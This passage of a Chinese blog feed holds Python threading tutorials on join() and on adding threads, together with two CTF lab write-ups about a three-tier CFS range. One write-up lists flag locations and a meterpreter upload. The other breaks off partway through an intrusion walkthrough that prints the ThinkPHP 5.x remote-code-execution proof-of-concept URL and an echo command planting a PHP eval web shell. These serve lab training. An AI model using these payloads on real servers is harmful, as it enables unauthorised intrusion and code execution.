class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用join控制多个线程的执行顺序很关键。</p><h1 id="0x02-添加第2个线程"><a href="#0x02-添加第2个线程" class="headerlink" title="0x02 添加第2个线程"></a>0x02 添加第2个线程</h1><p>这时如果我们加入第2个线程，但是不加入join功能，看看又是什么样，第2个线程的任务量较小，因此比第1个线程会更快执行，加入的第2个线程如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">thread_jobs2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 定义第2个线程</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'任务2开始\n'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'任务2结束\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出的一种结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python 3_join.py</span>任务1开始任务2开始任务2结束所有任务已完成任务1结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意这个时候任务1和任务2都没有添加join，也就是说输出的内容是什么完全看谁执行的快，谁先执行完谁就先输出，因此这里的输出结果并不唯一，这种杂乱的输出方式是不能接收的，所以需要使用join来控制。</p><h1 id="0x03-在不同位置使用join-的结果"><a href="#0x03-在不同位置使用join-的结果" class="headerlink" title="0x03 在不同位置使用join()的结果"></a>0x03 在不同位置使用join()的结果</h1><p>如果在任务2开始前只对任务1加入join功能：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 开始线程1</span>thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 对任务1加入join功能</span>thread2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 开始线程2</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'所有任务已完成\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其输出结果如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python 3_join.py</span>任务1开始任务1结束任务2开始任务2结束所有任务已完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到程序会先执行任务1再执行接下来的操作，如果在任务2开始后只对任务1加入join功能：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 开始线程1</span>thread2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 开始线程2</span>thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 对任务1加入join功能</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'所有任务已完成\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其输出结果如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python 3_join.py</span>任务1开始任务2开始任务2结束任务1结束所有任务已完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>任务1先于任务2启动，但由于任务2的处理时间较短，因此先于任务1完成，而由于任务1加入了join，因此“所有任务已完成”也在任务1完成后再显示。</p><h1 id="0x04-最终代码及输出结果"><a href="#0x04-最终代码及输出结果" class="headerlink" title="0x04 最终代码及输出结果"></a>0x04 最终代码及输出结果</h1><p>如果只对任务2加入join，同样输出结果就是要先等任务2执行完再执行其他程序，但是为了避免不必要的麻烦，推荐下面这种1221的V型排布，毕竟如果每个线程start()后就加入其join()，那就和单线程无异了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 开始线程1</span>thread2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 开始线程2</span>thread2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 对任务2加入join功能</span>thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 对任务1加入join功能</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最终完整代码及输出结果如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">thread_jobs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 定义第1个线程</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'任务1开始\n'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'任务1结束\n'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">thread_jobs2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 定义第2个线程</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'任务2开始\n'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'任务2结束\n'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>thread_jobs<span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'任务1'</span><span class="token punctuation">)</span>  <span class="token comment"># 定义线程1</span>    thread2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>thread_jobs2<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'任务2'</span><span class="token punctuation">)</span>  <span class="token comment"># 定义线程2</span>    thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 开始线程1</span>    thread2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 开始线程2</span>    thread2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 对任务2加入join功能</span>    thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 对任务1加入join功能</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'所有任务已完成\n'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python 3_join.py</span>任务1开始任务2开始任务2结束任务1结束所有任务已完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>参考文章：<a href="https://morvanzhou.github.io/tutorials/python-basic/threading">https://morvanzhou.github.io/tutorials/python-basic/threading</a><br>代码项目地址：<a href="https://github.com/teamssix/Python-Threading-study-notes">https://github.com/teamssix/Python-Threading-study-notes</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python Threading 学习笔记】2、添加线程</title>
      <link href="//191101-112015.html"/>
      <url>//191101-112015.html</url>
      
        <content type="html"><![CDATA[<p>往期内容：<br><a href="https://www.teamssix.com/year/1901031-202253.html">1、什么是多线程？</a></p><p>这一节主要学习Threading模块的一些基本操作，如获取线程数，添加线程等。</p><a id="more"></a><p>首先导入Threading模块</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取已激活的线程数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">threading<span class="token punctuation">.</span>active_count<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看所有线程信息</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">threading<span class="token punctuation">.</span><span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看现在正在运行的线程</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加线程，threading.Thread()接收参数target代表这个线程要完成的任务，需自行定义</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">thread_jobs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 定义要添加的线程</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'已激活的线程数： %s'</span> <span class="token operator">%</span> threading<span class="token punctuation">.</span>active_count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'所有线程信息： %s'</span> <span class="token operator">%</span> threading<span class="token punctuation">.</span><span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'正在运行的线程： %s'</span> <span class="token operator">%</span> threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>thread_jobs<span class="token punctuation">,</span> <span class="token punctuation">)</span>  <span class="token comment"># 定义线程</span>    thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 开始线程</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python 2_add_thread.py</span>已激活的线程数： <span class="token number">2</span>所有线程信息： <span class="token punctuation">[</span><span class="token operator">&lt;</span>_MainThread<span class="token punctuation">(</span>MainThread, stopped <span class="token number">16800</span><span class="token punctuation">)</span><span class="token operator">></span>, <span class="token operator">&lt;</span>Thread<span class="token punctuation">(</span>Thread-1, started <span class="token number">20512</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">]</span>正在运行的线程 <span class="token operator">&lt;</span>Thread<span class="token punctuation">(</span>Thread-1, started <span class="token number">20512</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>代码项目地址：<a href="https://github.com/teamssix/Python-Threading-study-notes">https://github.com/teamssix/Python-Threading-study-notes</a><br>参考文章：<a href="https://morvanzhou.github.io/tutorials/python-basic/threading">https://morvanzhou.github.io/tutorials/python-basic/threading</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python Threading 学习笔记】1、什么是多线程？</title>
      <link href="//1901031-202253.html"/>
      <url>//1901031-202253.html</url>
      
        <content type="html"><![CDATA[<p>多线程类似于同时执行多个不同程序，比如一个很大的数据，直接运行的话可能需要10秒钟才能运行完。</p><a id="more"></a><p>但如果使用Threading或者说使用多线程，我们把数据分成5段，每一段数据都放到一个单独的线程里面运算，所有线程同时开始。</p><p>这就好比原本一个工作只有一个人在做，但现在有了5个人同时在做，很明显可以大大的提高效率，节省时间。</p><p>如果平时有用过IDM下载东西的小伙伴，在下载文件的时候可以打开显示细节，就可以看到多个线程同时下载，传输速度基本能达到本地带宽的最高速度，下图可以很直观的看到多个线程同时下载的过程。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Threading1.gif?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：<a href="https://morvanzhou.github.io/tutorials/python-basic/threading">https://morvanzhou.github.io/tutorials/python-basic/threading</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【续】CFS三层靶机中的Flag位置及其获取</title>
      <link href="//191021-213828.html"/>
      <url>//191021-213828.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近写了一篇《CFS三层靶机搭建及其内网渗透》的文章，里面满满的干货，本篇文章需要结合《CFS三层靶机搭建及其内网渗透》一起看，这篇文章可以在本文底部找到阅读链接。</p><a id="more"></a><h1 id="0x01-Target1"><a href="#0x01-Target1" class="headerlink" title="0x01 Target1"></a>0x01 Target1</h1><p>1、系统根目录下</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>2、网站根目录下</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>3、网站robots.txt文件中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-Target2"><a href="#0x02-Target2" class="headerlink" title="0x02 Target2"></a>0x02 Target2</h1><p>1、系统根目录下</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>2、日志文件中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>3、passwd文件中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>4、crontab文件中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>5、网站根目录下</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>6、管理后台中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-Target3"><a href="#0x03-Target3" class="headerlink" title="0x03 Target3"></a>0x03 Target3</h1><p>1、通过meterpreter上传Everything工具并安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> upload ./Everything_64.exe C:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>2、利用Everything，直接搜索flag文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>3、找到两处flag，继续找寻发现计划任务中存在第三处flag</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag13.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>4、最后一处在事件日志的注册表中被找到</p><pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Eventlog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag14.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>《CFS三层靶机搭建及其内网渗透》文章地址：<br>1、首发地址：<a href="https://www.anquanke.com/post/id/187908">https://www.anquanke.com/post/id/187908</a><br>2、博客地址：<a href="https://www.teamssix.com/year/191021-211425.html">https://www.teamssix.com/year/191021-211425.html</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 实例演示 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> CFS </tag>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CFS三层靶机搭建及其内网渗透【附靶场环境】</title>
      <link href="//191021-211425.html"/>
      <url>//191021-211425.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文首发地址：<a href="https://www.anquanke.com/post/id/187908">https://www.anquanke.com/post/id/187908</a></p></blockquote><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。</p><a id="more"></a><p>在这三台主机中，每台我都放了多个flag，本文将只讲述每个靶机的攻击过程，对于flag的获取不做讨论，这点需要读者自己动手找到这些flag，如果你想知道自己找到的flag是否正确且齐全，同样可以在我的公众号“TeamsSix”回复“flag”以获取。</p><h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>简单对主机搭建的环境画了个网络拓扑，攻击机的网段在192.168.1.1/24，三台靶机的IP地址分别如图 1所示。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>图 1</p><p>Vmware的3个网卡分别配置为桥接，仅主机和仅主机，具体子网地址如图 2所示。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>图 2</p><p>如果你想在自己的电脑上搭建此靶场的话，需要先将自己Vmware中的虚拟网络编辑器编辑成图 2的样子，之后将三个靶机的OVA文件导入到自己的VMware中即可，这三个虚拟机的IP地址我都已经手动分配成了图 1的样子。</p><blockquote><p>注意：这里桥接模式的网卡设置成自己能联网的网卡即可，因为我发现设置成自动有时会存在虚拟机连不上外网的情况。</p></blockquote><h1 id="0x02-Target1"><a href="#0x02-Target1" class="headerlink" title="0x02 Target1"></a>0x02 Target1</h1><h2 id="a、获取shell"><a href="#a、获取shell" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、先用nmap扫描一下Target1</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># nmap -T4 -O 192.168.1.11</span>Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2019</span>-10-04 05:51 EDTNmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.11Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00042s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">994</span> filtered portsPORT     STATE  SERVICE<span class="token number">20</span>/tcp   closed ftp-data<span class="token number">21</span>/tcp   <span class="token function">open</span>   <span class="token function">ftp</span><span class="token number">22</span>/tcp   <span class="token function">open</span>   <span class="token function">ssh</span><span class="token number">80</span>/tcp   <span class="token function">open</span>   http<span class="token number">888</span>/tcp  <span class="token function">open</span>   accessbuilder<span class="token number">8888</span>/tcp <span class="token function">open</span>   sun-answerbookMAC Address: 00:0C:29:81:A6:6D <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux <span class="token number">3.10</span> - <span class="token number">4.11</span>Network Distance: <span class="token number">1</span> hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">8.97</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到Target1存在ftp、ssh、http等端口，且是一个Linux的操作系统。</p><p>2、既然存在http服务，那就用浏览器打开看看是个什么<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、原来是ThinkPHP 5.X框架，这不禁让我想到18年底爆出的该框架的远程命令执行漏洞，那就先用POC测试一下</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、成功出现了PHPinfo界面，说明该版本是存在这在漏洞的，接下来就可以直接上工具写入一句话了，当然也可以使用POC写入一句话，不过还是工具方便些<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、在工具中命令是可以被执行的，那就getshell吧<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>6、昂~ getshell失败，没关系，直接echo写入一句话</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"&lt;?php @eval(<span class="token variable">$_POST</span>['TeamsSix']);?>"</span> <span class="token operator">></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>7、通过浏览器访问，查看shell.php是否上传成功<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>8、可以看到shell.php已经被上传上去了，但是提示语法错误，同时蚁剑也返回数据为空，看来一句话上传的有点问题，那就cat查看一下<br><img 